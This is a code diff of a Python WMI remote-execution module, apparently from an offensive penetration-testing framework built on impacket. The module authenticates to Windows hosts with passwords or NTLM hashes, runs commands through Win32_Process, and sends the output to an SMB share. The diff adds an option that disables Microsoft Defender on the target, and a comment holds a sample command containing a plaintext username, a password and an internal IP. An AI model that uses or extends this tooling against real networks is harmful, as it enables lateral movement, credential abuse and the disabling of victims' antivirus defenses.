@@ -31,14 +31,11 @@ import cmd
 
 from gevent import sleep
 from cmx.helpers.misc import gen_random_string
-from impacket.dcerpc.v5.dcomrt import DCOMConnection
-from impacket.smbconnection import SMBConnection
-from impacket.smb import SMB_DIALECT
-from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
-from impacket.dcerpc.v5.dcom import wmi
-from impacket.dcerpc.v5.dtypes import NULL
+
 from cmx import config as cfg
 import time
+
+import impacket
 
 OUTPUT_FILENAME = '__output'
 BATCH_FILENAME  = 'execute.bat'
@@ -47,7 +44,7 @@ DUMMY_SHARE     = 'TMP'
 CODEC = sys.stdout.encoding
 
 class WMIEXEC:
-    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
+    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, killDefender=False):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -64,6 +61,7 @@ class WMIEXEC:
         self.__aesKey = None
         self.__doKerberos = False
         self.__retOutput = True
+        self.__killDefender = killDefender
 
         #This checks to see if we didn't provide the LM Hash
         if hashes is not None:
@@ -77,32 +75,34 @@ class WMIEXEC:
 
         dialect = smbconnection.getDialect()
         
-        if dialect == SMB_DIALECT:
+        if dialect == impacket.smb.SMB_DIALECT:
             logging.debug("SMBv1 dialect used")
-        elif dialect == SMB2_DIALECT_002:
+        elif dialect == impacket.smb3structs.SMB2_DIALECT_002:
             logging.debug("SMBv2.0 dialect used")
-        elif dialect == SMB2_DIALECT_21:
+        elif dialect == impacket.smb3structs.SMB2_DIALECT_21:
             logging.debug("SMBv2.1 dialect used")
         else:
             logging.debug("SMBv3.0 dialect used")
 
 
-        self.__dcom  = DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, 
+        self.__dcom  = impacket.dcerpc.v5.dcomrt.DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, 
                                       self.__nthash,self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos)
         try:
-            iInterface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
-            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
-            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+            iInterface = self.__dcom.CoCreateInstanceEx(impacket.dcerpc.v5.dcom.wmi.CLSID_WbemLevel1Login,impacket.dcerpc.v5.dcom.wmi.IID_IWbemLevel1Login)
+            iWbemLevel1Login = impacket.dcerpc.v5.dcom.wmi.IWbemLevel1Login(iInterface)
+            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', impacket.dcerpc.v5.dtypes.NULL, impacket.dcerpc.v5.dtypes.NULL)
             iWbemLevel1Login.RemRelease()
 
             self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
         except  (Exception, KeyboardInterrupt) as e:
-                   if logging.getLogger().level == logging.DEBUG:
-                       import traceback
-                       traceback.print_exc()
-                   logging.error(str(e))
-                   if smbConnection is not None:
-                       smbConnection.logoff()
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+                logging.error(str(e))
+            if smbconnection is not None:
+                smbconnection.logoff()
+            self.__dcom.disconnect()
+            sys.stdout.flush()
 
 
     def execute(self, command, output=False):
@@ -110,8 +110,15 @@ class WMIEXEC:
         if self.__retOutput:
             self.__smbconnection.setTimeout(100000)
 
+        #self.disable_notifications()
+        if self.__killDefender: self.disable_defender()
+
         self.execute_handler(command)
-        self.__dcom.disconnect()
+
+        if self.__smbconnection is not None:
+            self.__smbconnection.logoff()
+        #self.__dcom.disconnect()   # does this leave a sess up?
+
         return self.__outputBuffer
 
     def cd(self, s):
@@ -130,16 +137,12 @@ class WMIEXEC:
 
     def execute_handler(self, data):
         if self.__retOutput:
-            #self.disable_notifications()
-            self.disable_defender()
             try:
                 self.execute_fileless(data)
             except:
                 self.cd('\\')
                 self.execute_remote(data)
         else:
-            #self.disable_notifications()
-            self.disable_defender()
             self.execute_remote(data)
 
 
@@ -160,27 +163,27 @@ class WMIEXEC:
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
 
 
-        commandData = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
                                                                          self.__share_name,
                                                                          self.__output)
         #commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
-        #                                                                 self.__share_name,
-        #                                                                 self.__output)
+        #                                                      self.__share_name,
+        #                                                      self.__output)
         
         #adding creds gets past systems disallowing guest-auth
         # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
-        command = self.__shell + '"net use * /d /y & '
-        command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
-                                                                                                 self.__share_name, 
-                                                                                                 self.__username, 
-                                                                                                 self.__password, 
-                                                                                                 commandData)
-        #command += 'net use \\\\{}\\{} /savecred /p:no /user:{} {}"'.format(local_ip, 
+        #command = self.__shell + '"net use * /d /y & '
+        #command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
         #                                                                                         self.__share_name, 
         #                                                                                         self.__username, 
-        #                                                                                         self.__password 
-        #                                                                                         )
-        
+        #                                                                                         self.__password, 
+        #                                                                                         commandData)
+
+        #command = self.__shell + 'net use * /d /y'
+        #command += self.__shell + 'net use \\\\{}\\{} & {} "'.format(local_ip, 
+        #                                            self.__share_name,  
+        #                                            commandData)
+
         logging.debug('wmi Executing_fileless command: {}'.format(command))
 
         self.__win32Process.Create(command, self.__pwd, None)
